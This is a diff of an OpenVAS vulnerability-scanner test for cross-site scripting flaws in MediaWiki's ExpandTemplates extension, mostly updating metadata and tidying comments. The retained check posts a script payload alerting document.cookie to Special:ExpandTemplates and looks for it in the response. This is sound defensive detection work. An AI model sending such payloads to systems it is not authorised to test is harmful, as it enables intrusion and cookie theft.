@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mediawiki_expandtemplates_mul_xss_vuln.nasl 6709 2017-07-12 15:16:14Z cfischer $
+# $Id: gb_mediawiki_expandtemplates_mul_xss_vuln.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # MediaWiki ExpandTemplates extension Multiple Vulnerabilities - Jan15
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:mediawiki:mediawiki";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805327");
-  script_version("$Revision: 6709 $");
+  script_version("$Revision: 11291 $");
   script_cve_id("CVE-2014-9276", "CVE-2014-9478");
   script_tag(name:"cvss_base", value:"5.1");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 17:16:14 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-01-23 12:37:41 +0530 (Fri, 23 Jan 2015)");
   script_name("MediaWiki ExpandTemplates extension Multiple Vulnerabilities - Jan15");
 
@@ -60,8 +60,8 @@ if(description)
   or later. For updates refer to http://www.mediawiki.org/wiki/Extension:ExpandTemplates");
 
   script_tag(name:"solution_type", value:"VendorFix");
-  script_xref(name : "URL" , value : "https://phabricator.wikimedia.org/T773111");
-  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2015/01/03/13");
+  script_xref(name:"URL", value:"https://phabricator.wikimedia.org/T773111");
+  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/01/03/13");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -76,26 +76,16 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-dir = "";
-reqwiki = "";
-reswiki = "";
-wikiPort = "";
-
 if(!wikiPort = get_app_port(cpe:CPE)) exit(0);
 if(!dir = get_app_location(cpe:CPE, port:wikiPort)) exit(0);
 
 reqwiki = http_get(item:string(dir, "/index.php/Special:Version"), port:wikiPort);
 reswiki = http_keepalive_send_recv(port:wikiPort, data:reqwiki);
 
-## confirm the plugin
 if (reswiki =~">ExpandTemplates<") {
 
    host = http_host_name(port:wikiPort);
 
-   ## Construct the attack request
    postData = string('contexttitle=&input=<html><script>alert(document.cookie)</script>
                       </html>&removecomments=1&wpEditToken=+\\');
    url =dir+"/index.php/Special:ExpandTemplates";
@@ -109,7 +99,6 @@ if (reswiki =~">ExpandTemplates<") {
 
    rcvRes = http_keepalive_send_recv(port:wikiPort, data:sndReq);
 
-   #Confirm Exploit
    if (rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< rcvRes)
    {
     security_message(wikiPort);
